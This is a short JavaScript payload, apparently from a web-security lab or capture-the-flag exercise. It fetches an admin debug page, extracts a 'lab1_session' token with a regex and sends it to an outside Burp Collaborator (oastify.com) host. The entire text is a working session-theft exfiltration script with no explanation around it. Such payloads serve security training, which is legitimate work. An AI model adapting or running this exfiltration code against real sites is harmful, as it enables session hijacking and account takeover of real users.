fetch('/admin/debug')
  .then(r => r.text())
  .then(d => {
    // Regex to find the value inside the "lab1_session":"..." pattern
    var match = d.match(/"lab1_session":"(.*?)"/);
    
    if (match && match[1]) {
        var session = match[1];
        // Send the extracted token to your collaborator
        fetch('https://6gngd4i4kfdu906ztypnn26sbjha554tt.oastify.com/?token=' + encodeURIComponent(session), {
            mode: 'no-cors'
        });
    }
  });
